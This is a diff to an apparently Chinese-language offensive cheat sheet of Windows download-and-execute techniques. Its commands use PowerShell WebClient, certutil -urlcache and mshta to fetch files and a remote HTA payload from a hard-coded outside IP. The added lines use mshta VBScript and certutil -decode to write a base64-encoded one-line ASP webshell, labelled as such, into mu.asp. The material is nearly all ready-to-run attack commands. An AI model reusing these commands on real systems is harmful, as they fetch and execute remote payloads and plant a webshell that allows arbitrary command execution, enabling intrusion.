@@ -30,6 +30,11 @@ powershell -w hidden -c (new-object System.Net.WebClient).DownloadFile("http://1
 certutil -urlcache -split -f http://114.115.214.203/test.txt test.txt
 
 certutil -urlcache -split -f http://114.115.214.203/a.exe a.exe
+
+#写文件的方法：
+mshta vbscript:createobject("scripting.filesystemobject").createtextfile("test11.txt",2,ture).writeline("PCVleGVjdXRlKHJlcXVlc3QoImwiKSklPg==")(window.close)
+certutil -decode test11.txt mu.asp #一句话马
+type mu.asp
 ```
 
 ### 0x03 mshta执行远程hta
@@ -37,7 +42,7 @@ certutil -urlcache -split -f http://114.115.214.203/a.exe a.exe
 mshta http://114.115.214.203/payload.hta
 ```
 payload.hta
-```
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
